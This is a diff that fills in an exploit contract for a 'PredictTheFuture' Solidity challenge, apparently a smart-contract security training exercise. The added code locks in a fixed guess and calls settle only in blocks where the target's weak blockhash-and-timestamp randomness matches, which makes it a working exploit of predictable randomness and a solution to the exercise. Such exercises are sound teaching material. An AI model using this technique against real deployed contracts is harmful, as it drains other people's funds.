@@ -48,10 +48,40 @@ contract PredictTheFuture {
 
 contract ExploitContract {
     PredictTheFuture public predictTheFuture;
+    uint8 guess;
 
     constructor(PredictTheFuture _predictTheFuture) {
         predictTheFuture = _predictTheFuture;
     }
 
     // Write your exploit code below
+    function lockInGuess() public payable {
+        guess = 1;
+        predictTheFuture.lockInGuess{value: 1 ether}(guess);
+    }
+
+    /// @dev instead of trying to find a time ahead that works, we have guess a number and dont
+    /// settle until the guess is correct
+    /// @dev this is possible because the answer is % 10 so their is only 10 possible answers and
+    /// it is bound to come up
+    function exploit() public {
+        uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        ) % 10;
+
+        if (answer == guess) {
+            predictTheFuture.settle();
+        }
+    }
+
+    receive() external payable {}
+
+    fallback() external payable {}
 }
